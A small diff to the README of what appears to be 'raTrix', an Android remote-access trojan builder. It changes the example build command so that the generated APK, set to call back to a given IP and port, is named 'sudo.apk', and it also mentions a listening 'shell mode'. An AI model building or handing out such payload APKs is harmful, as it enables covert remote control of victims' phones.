@@ -84,7 +84,7 @@ Usage:
 # Examples 
 <b>in buliding mode(generating apk)</b>
 ```
-python3 raTrix.py -i 192.169.120.34 -p 8080
+python3 raTrix.py -i 192.169.120.34 -p 8080 -o sudo.apk
 ```
 
 <b>in shell mode (listening)</b>
